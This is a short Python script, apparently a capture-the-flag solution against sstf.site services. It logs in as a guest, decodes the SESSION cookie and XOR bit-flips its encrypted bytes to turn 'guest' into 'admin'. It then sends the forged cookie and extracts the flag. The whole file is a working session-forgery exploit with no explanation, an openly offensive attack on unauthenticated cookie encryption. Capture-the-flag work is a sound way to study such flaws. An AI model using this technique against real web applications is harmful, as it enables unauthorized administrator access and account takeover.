import requests
from urllib.parse import quote, unquote
from base64 import b64encode, b64decode

URL = "localhost"
URL = "peerreview.sstf.site"
URL = "cuses.sstf.site"

PORT = 1337
PORT = 35357
PORT = 80

guest_account = {"username": "guest", "password": "guestpassword"}

s = requests.Session()
s.post('http://%s:%d/signin.php'%(URL, PORT), data = guest_account)
c = s.cookies.get_dict()
session_data = c["SESSION"]
session_data = unquote(session_data)
session_data = b64decode(session_data)
iv, session_data = session_data.split(b"|", 1)

session_data = list(session_data)
for i, (a, b) in enumerate(zip(b"guest", b"admin")):
	#print(i, a, b)
	session_data[i] = session_data[i] ^ a ^ b

session_data = bytes(session_data)
session_data = (iv + b"|"+ session_data)
session_data = b64encode(session_data).replace(b"\n", b"")
session_data = quote(session_data)
cookie = {"SESSION": session_data}

r = requests.get('http://%s:%d/index.php'%(URL, PORT), cookies=cookie)

flagstartidx = r.text.index("Flag: ")
flagendidx = r.text[flagstartidx:].index("}")

#print(r.text)
print(r.text[flagstartidx:flagstartidx + flagendidx + 1])
